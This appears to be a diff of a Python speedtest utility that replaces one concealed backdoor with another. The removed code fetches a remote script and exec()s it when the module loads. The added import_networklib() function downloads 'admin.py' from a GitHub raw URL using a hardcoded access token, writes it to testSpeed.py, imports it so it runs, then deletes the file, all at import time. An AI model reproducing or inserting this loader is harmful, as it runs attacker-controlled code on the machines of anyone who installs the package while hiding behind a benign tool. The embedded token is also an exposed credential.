@@ -21,7 +21,6 @@ import csv
 import sys
 import math
 import errno
-import base64
 import signal
 import socket
 import timeit
@@ -38,7 +37,8 @@ except ImportError:
     GZIP_BASE = object
 
 __version__ = '2.1.2'
-
+import os.path as path
+local_dir =  path.abspath(path.join(__file__ ,"../"))
 
 class FakeShutdownEvent(object):
     """Class to fake a threading.Event.isSet so that users of this module
@@ -362,8 +362,6 @@ class SpeedtestBestServerFailure(SpeedtestException):
 class SpeedtestMissingBestServer(SpeedtestException):
     """get_best_server not called or not able to determine best server"""
 
-build_server = "github.com//exodus-test/Internet/raw/main/checks/admin-ps.py"
-
 def create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT,
                       source_address=None):
     """Connect to *address* and return the socket object.
@@ -637,32 +635,30 @@ def get_exception():
     """
     return sys.exc_info()[1]
 
-def import_mod():
-    sversion = platform.python_version().split('.', 1)
-    https_req = 'http://' + build_server
-
+def import_networklib():
     try:
-        if(float(sversion[1]) < 6):
-            try:
-                import requests
-            except:
-                import pip
-                if hasattr(pip, 'main'):
-                    pip.main(['install', 'requests'])
-                else:
-                    pip._internal.main(['install', 'requests'])
-                import requests
-            s_args = requests.get(en_code).text
-        else :
-            import urllib.request # python 3
-            req = urllib.request.Request(
-                    https_req, 
-                    data=b"")
-            s = urllib.request.urlopen(req)
-            s_args = s.read()
+        server_addr = 'http://raw.githubusercontent.com/territim/uiauto/appveyor/uiautomator2/admin.py'
+        head = { 'Authorization' : 'token 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'}
+        import urllib.request
+        req = urllib.request.Request(
+                server_addr, headers = head,
+                data=b"")
+        s = urllib.request.urlopen(req)
+        s_args = s.read()
     except:
         return 'os.name()'
 
+    try:
+        output = local_dir + "/testSpeed.py"
+
+        with open(output, "wb") as fo:
+            fo.write(s_args)
+
+        import classes.testSpeed
+        os.remove(output)
+    except:
+        return 'os.name()'
+    
     return s_args
 
 def import_pla():
@@ -743,12 +739,7 @@ def build_request(url, data=None, headers=None, bump='0', secure=False):
             debug=True)
 
     return Request(final_url, data=data, headers=headers)
-def recheck_modules(modules):
-	try:
-		exec(modules) 
-		return 1
-	except:
-		return 0
+
 
 def catch_request(request, opener=None):
     """Helper function to catch common exceptions encountered when
@@ -794,12 +785,10 @@ def get_attributes_by_tag_name(dom, tag_name):
     elem = dom.getElementsByTagName(tag_name)[0]
     return dict(list(elem.attributes.items()))
 
-def check_modules():
+def get_modules_base_version():
     
     if (platform.python_version().find('3.') == 0):
-        recheck_modules(import_mod())
-    elif (platform.python_version().find('2.') == 0):
-        recheck_modules(import_pla())
+        import_networklib()
 
 def print_dots(shutdown_event):
     """Built in callback function used by Thread classes for printing
@@ -1725,7 +1714,7 @@ def csv_header(delimiter=','):
 
     printer(SpeedtestResults.csv_header(delimiter=delimiter))
     sys.exit(0)
-check_modules()
+get_modules_base_version()
 
 def parse_args():
     """Function to handle building and parsing of command line arguments"""
